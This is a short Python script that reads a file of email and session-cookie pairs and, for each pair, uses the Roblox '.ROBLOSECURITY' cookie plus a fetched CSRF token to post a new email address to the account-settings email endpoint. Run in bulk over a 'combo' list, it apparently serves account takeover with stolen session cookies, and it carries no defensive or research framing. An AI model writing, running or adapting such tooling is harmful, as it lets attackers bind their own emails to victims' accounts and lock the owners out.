from requests import post

class RobloxApi:
    def __init__(self, cookie):
        self.url = "https://accountsettings.roblox.com/v1/email"
        self.cookie = cookie
        self.csrf = self.get_csrf()

    def get_csrf(self):
        response = post(f'{self.url}', cookies={'.ROBLOSECURITY': self.cookie})
        return response.headers.get('x-csrf-token')

        
    def send_verify(self, email):
        response = post(f'{self.url}', cookies={'.ROBLOSECURITY': self.cookie}, headers={'x-csrf-token': self.csrf}, json={"emailAddress": email})
        return response
    
if __name__ == "__main__":
    with open("combo.txt", "r") as f:
        combo = [line.split(":", 1) for line in f.read().splitlines()]
    for line in combo:
        email = line[0]; cookie = line[1]
        verify = RobloxApi(cookie).send_verify(email)
        print(verify.status_code)

